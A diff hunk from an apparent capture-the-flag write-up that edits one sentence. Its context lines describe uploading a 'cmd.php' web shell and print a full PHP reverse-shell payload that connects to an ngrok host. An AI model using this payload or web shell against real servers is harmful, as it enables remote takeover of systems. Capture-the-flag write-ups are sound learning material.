@@ -140,6 +140,6 @@ Now, that we have successfully changed the header we can upload our file "cmd.ph
 
 after that I just launched a reverse shell on my computer using a TCP connection with an ngrock server. So I was able to have a shell. The next step was to look for the flag on the server. I spent a lot of time looking for the flag before finding it one of the files present on the server. 
 
-Here is the payload that I used to get the shell:<br>
+Here the payload that I used to get the shell:<br>
 ```http://16.170.159.222/images/cmd.php?cmd=php+-r+'$sock%3dfsockopen("tcp://4.tcp.ngrok.io",16205)%3bexec("sh+<%263+>%263+2>%263")%3b'```
 </details>
